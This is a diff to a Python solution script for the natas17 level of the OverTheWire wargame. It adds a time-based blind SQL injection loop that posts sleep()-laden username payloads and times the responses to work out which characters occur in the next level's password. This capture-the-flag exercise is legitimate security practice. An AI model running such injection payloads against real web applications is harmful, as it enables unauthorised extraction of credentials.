@@ -1,6 +1,7 @@
 import requests
 import bs4
 import re
+import string
 
 
 # configuration for natas17
@@ -45,13 +46,32 @@ data = {
     "submit" : "submit"
 }
 response = session.post(URL, data=data)
-print(response.elapsed.total_seconds())
+print(f"example 1: time elapsed = {response.elapsed.total_seconds()}s")
 
 data = {
     "username" : "natas18\" and sleep(10) # A ",
     "submit" : "submit"
 }
 response = session.post(URL, data=data)
-print(response.elapsed.total_seconds())
+print(f"example 2: time elapsed = {response.elapsed.total_seconds()}s")
+print('\n')
 # as we can see, the first request returned almost immediately as the user doesn't exist in the database
 # the second request, however, returned after 10 seconds, which is the sleep time that we set in the sleep() function
+
+
+# STEP 1: get the possible characters in the password
+SLEEP_SECONDS = 3
+possible_chars = string.ascii_letters + string.digits
+password_chars = ""
+for char in possible_chars:
+    print(f"password_chars: {password_chars + char}", end='\r')
+    data = {
+        "username" : f'natas18" and password like binary "%{char}%" and sleep({SLEEP_SECONDS}) # A ',
+        "submit" : 'submit'
+    }
+    response = session.post(URL, data=data)
+    # if the response time exceeded the sleep time, then the character is in the password
+    if response.elapsed.total_seconds() > SLEEP_SECONDS:
+        password_chars += char
+        print(f'password_chars: {password_chars}', end='\r')
+print('\n')
